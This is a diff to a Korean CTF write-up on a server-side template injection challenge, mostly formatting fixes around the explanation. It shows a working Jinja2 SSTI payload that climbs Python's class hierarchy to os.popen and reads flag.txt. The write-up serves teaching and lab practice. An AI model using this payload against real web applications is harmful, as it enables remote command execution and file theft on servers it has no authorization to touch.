@@ -15,7 +15,7 @@ categories: [CTF]
 tags: [TIL, WEB, CTF]
 ---
 
-<!-- markdownlint-disable MD010 MD025 -->
+<!-- markdownlint-disable MD010 MD025 MD033 -->
 
 # Simple-ssti
 
@@ -23,7 +23,7 @@ tags: [TIL, WEB, CTF]
 
 ## 1. Vuln
 
-SSTI(Server-side Template Injection): 
+SSTI(Server-side Template Injection):
 
 ## 2. Code
 
@@ -66,13 +66,17 @@ FLAG는 `./flag.txt`에서 읽어와 `app.secret_key`로 저장하고 있다.
 
 ## 3. Payload
 
+{ % raw % }
 `{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read()}}`
+{ % endraw % }
 
 코드에 대해서 설명하자면
 
 ### 전체 구조
 
+{ % raw %}
 `{{ ... }}`: 템플릿 코드 Jinja로 감싸기
+{ % endraw %}
 
 ### 객체 탈출(파이썬 리플렉션 체인)
 
